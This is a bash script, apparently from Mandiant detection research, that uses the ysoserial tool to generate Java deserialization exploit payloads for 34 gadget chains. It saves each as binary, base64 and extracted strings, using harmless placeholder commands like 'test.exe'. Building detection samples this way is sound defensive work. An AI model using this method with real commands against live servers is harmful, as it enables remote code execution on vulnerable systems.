# Copyright (C) 2021 Alyssa Rahman, Mandiant, Inc. All Rights Reserved.
# Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
# You may obtain a copy of the License at: [package root]/LICENSE.txt
# Unless required by applicable law or agreed to in writing, software distributed under the License
#  is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and limitations under the License.

##########################################
# YSoSerial.NET v1.34 payload generation #
##########################################
## Author: Alyssa Rahman (@ramen0x3f)
## Last Updated: 2021-12-02 (YSoSerial)

# List pulled 2021-11-10
ysoserial_chains=("AspectJWeaver" "BeanShell1" "C3P0" "Click1" "Clojure" "CommonsBeanutils1" "CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections4" "CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "FileUpload1" "Groovy1" "Hibernate1" "Hibernate2" "JavassistWeld1" "JBossInterceptors1" "Jdk7u21" "JRMPClient" "JRMPListener" "JSON1" "Jython1" "MozillaRhino1" "MozillaRhino2" "Myfaces1" "Myfaces2" "ROME" "Spring1" "Spring2" "URLDNS" "Vaadin1" "Wicket1" )

# Loop through all chains
for c in "${ysoserial_chains[@]}"; do

    # Set payload and output options
    filename="./ysoserial_$c"
    case "$c" in
        "AspectJWeaver")
            payload="test.txt;dGVzdAo="
            ;;
        "C3P0" | "Myfaces2")
            payload="http://test:Test"
            ;;
        "FileUpload1")
            payload="write;C:\\temp;test"
            ;;
        "JRMPListener")
            payload="12345"
            ;;
        "Jython1")
            payload="./server.py;/temp/test.py" #This need (any) Python script. Fails if first filepath not found.
            ;;
        "URLDNS")
            payload="http://test"
            ;;
        "Wicket1")
            payload="write;/tmp;test"
            ;;
        *)
            payload="test.exe"
            ;;
    esac

    # Generate payload
    java -jar ysoserial.jar "$c" "$payload" > "$filename.bin" 2>&-

    # Clean up empty files and print status
    if [ ! -s "$filename.bin" ] ; then
        rm "$filename.bin"
        echo "[!] ERROR    Could not generate $c - $payload"
    else
        echo "[+] $c - $payload -> $filename.bin"
        base64 -w0 "$filename.bin" > "$filename.base64" #Encode
        strings "$filename.bin" | grep -E '\..*\.' | head -5 > "$filename.strings" #Extract strings
    fi

done
